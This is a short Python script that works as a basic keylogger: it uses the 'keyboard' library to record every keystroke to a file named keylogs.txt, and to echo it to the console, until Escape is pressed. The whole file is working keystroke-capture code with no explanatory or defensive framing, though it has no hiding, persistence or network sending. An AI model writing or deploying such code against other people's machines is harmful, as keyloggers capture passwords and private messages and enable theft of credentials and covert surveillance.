import keyboard
import time

def main():
    with open("keylogs.txt", "a") as f:
        while True:
            event = keyboard.read_event()
            if event.name == 'esc':
                break
            elif len(event.name) > 1 or event.name.isalnum():
                f.write(str(event.name))
            else:
                f.write(event.name)
            print(f"Key {event.name} was pressed")

if __name__ == "__main__":
    main()